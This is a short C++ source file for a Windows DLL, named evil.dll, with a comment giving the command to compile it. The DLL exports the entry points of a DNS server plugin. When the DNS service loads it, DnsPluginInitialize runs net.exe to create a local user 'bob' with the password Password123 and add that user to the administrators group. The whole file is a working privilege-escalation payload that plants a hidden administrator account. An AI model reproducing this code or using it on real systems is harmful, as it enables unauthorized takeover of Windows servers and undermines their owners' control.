#include <windows.h>
#include <stdlib.h>


// Here so I remember how to compile it.
// x86_64-w64-mingw32-gcc -shared -o evil.dll evildll.cpp

extern "C" __declspec(dllexport) int DnsPluginInitialize(PVOID a1, PVOID a2)
{
  system("net.exe user bob Password123 /add");
  system("net.exe localgroup administrators bob /add");
  return 0;
}

extern "C" __declspec(dllexport) int DnsPluginCleanup()
{
  return 0;
}

extern "C" __declspec(dllexport) int DnsPluginQuery(PSTR a1, WORD a2, PSTR a3, PVOID a4)
{
  return 0;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        OutputDebugString("DLL_PROCESS_ATTACH");
        break;

    case DLL_THREAD_ATTACH:
        OutputDebugString("DLL_THREAD_ATTACH");
        break;

    case DLL_THREAD_DETACH:
        OutputDebugString("DLL_THREAD_DETACH");
        break;

    case DLL_PROCESS_DETACH:
        OutputDebugString("DLL_PROCESS_DETACH");
        break;
    }

    return TRUE;
}